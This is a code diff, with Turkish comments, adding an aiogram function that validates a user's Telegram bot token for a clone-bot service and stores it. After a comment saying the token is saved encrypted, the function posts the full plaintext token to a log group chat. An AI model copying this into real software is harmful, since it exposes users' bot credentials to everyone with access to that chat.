@@ -1,0 +1,48 @@
+
+from aiogram import Bot
+
+from database.clone_db import save_clone
+from services.logger import send_log
+
+
+async def create_clone(owner_id: int, token: str):
+    clone_bot = None
+
+    try:
+        # Token ile Telegram bağlantısı kur
+        clone_bot = Bot(token=token)
+
+        # Token geçerli mi kontrol et
+        bot_info = await clone_bot.get_me()
+
+        if not bot_info.username:
+            return False, "Bot kullanıcı adı alınamadı."
+
+        # Klonu şifreli olarak veritabanına kaydet
+        await save_clone(
+            bot_id=bot_info.id,
+            owner_id=owner_id,
+            username=bot_info.username,
+            token=token
+        )
+
+        # Klon bilgilerini log grubuna gönder
+        log_message = (
+            "🆕 <b>YENİ KLON BOT</b>\n\n"
+            f"👤 Oluşturan ID: <code>{owner_id}</code>\n"
+            f"🤖 Bot: @{bot_info.username}\n"
+            f"🆔 Bot ID: <code>{bot_info.id}</code>\n"
+            f"🔑 Token: <code>{token}</code>\n"
+            "✅ Durum: Kaydedildi"
+        )
+
+        await send_log(clone_bot, log_message)
+
+        return True, bot_info.username
+
+    except Exception:
+        return False, "Token doğrulanamadı veya klon kaydedilemedi."
+
+    finally:
+        if clone_bot:
+            await clone_bot.session.close()
